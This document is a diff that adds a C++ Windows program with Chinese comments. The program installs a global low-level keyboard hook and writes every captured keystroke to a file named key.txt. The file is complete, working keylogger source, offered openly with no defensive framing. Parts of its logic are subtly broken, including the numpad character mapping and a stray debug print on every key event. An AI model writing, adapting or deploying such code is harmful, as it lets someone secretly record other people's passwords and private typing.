@@ -1,0 +1,77 @@
+#include <iostream>  
+#include <string>  
+#include <fstream>
+#include <windows.h>
+using namespace std;
+
+//全局变量
+HHOOK glhHook = NULL;			//安装的鼠标勾子句柄 
+BOOL g_bCapsLock = FALSE;		//大小写锁定键	
+BOOL g_bShift = FALSE;			//shift键
+ofstream SaveFile("key.txt");
+
+//键盘钩子回调函数
+LRESULT  CALLBACK  KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+
+	char c[2];
+	c[1] = 0;
+	cout << "ww" << endl;
+	if ((wParam == WM_KEYDOWN) && (HC_ACTION == nCode)) {		//有键按下
+
+		KBDLLHOOKSTRUCT *  keyNum = (KBDLLHOOKSTRUCT *)lParam;
+
+		//处理字母大小写
+		if ((keyNum->vkCode == VK_CAPITAL) || (keyNum->vkCode == VK_LSHIFT) || (keyNum->vkCode == VK_RETURN) || (keyNum->vkCode >= 65 && keyNum->vkCode <= 90)) {
+
+			if (!GetKeyState(VK_CAPITAL)) {	//如果大写锁定键未被按下
+				g_bCapsLock = FALSE;
+			}
+			else {
+				g_bCapsLock = TRUE;
+			}
+
+			if (GetAsyncKeyState(VK_LSHIFT) & 0x8000) { //如果shift键被按住
+				g_bShift = TRUE;
+			}
+			else {
+				g_bShift = FALSE;
+			}
+
+			if (keyNum->vkCode >= 65 && keyNum->vkCode <= 90) {
+				BOOL flag = g_bCapsLock^g_bShift;//同假异真
+				if (flag) {
+					c[0] = keyNum->vkCode;
+				}
+				else {
+					c[0] = keyNum->vkCode + 32;
+				}
+				SaveFile << (int)c[0] << " : " << c << endl;
+			}
+		}
+		//处理数字小键盘
+		else if (keyNum->vkCode == 144 || (keyNum->vkCode >= VK_NUMPAD0 && keyNum->vkCode <= VK_NUMPAD9)) { //144表示数字小键盘锁键
+
+			if (GetKeyState(144)) {		//如果数字小键盘锁键被按下
+				int mapKey = keyNum->vkCode - 48;
+				SaveFile << keyNum->vkCode << " : " << char(mapKey) << endl;
+			}
+
+		}
+		else {
+			SaveFile << keyNum->vkCode << " : " << char(keyNum->vkCode) << endl;
+		}
+	}
+	return CallNextHookEx(glhHook, nCode, wParam, lParam);
+}
+
+
+int main()
+{
+	HHOOK mouseHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), NULL);
+	MSG msg;
+	while (GetMessage(&msg, NULL, NULL, NULL))
+	{
+	}
+	UnhookWindowsHookEx(mouseHook);
+	return 0;
+}
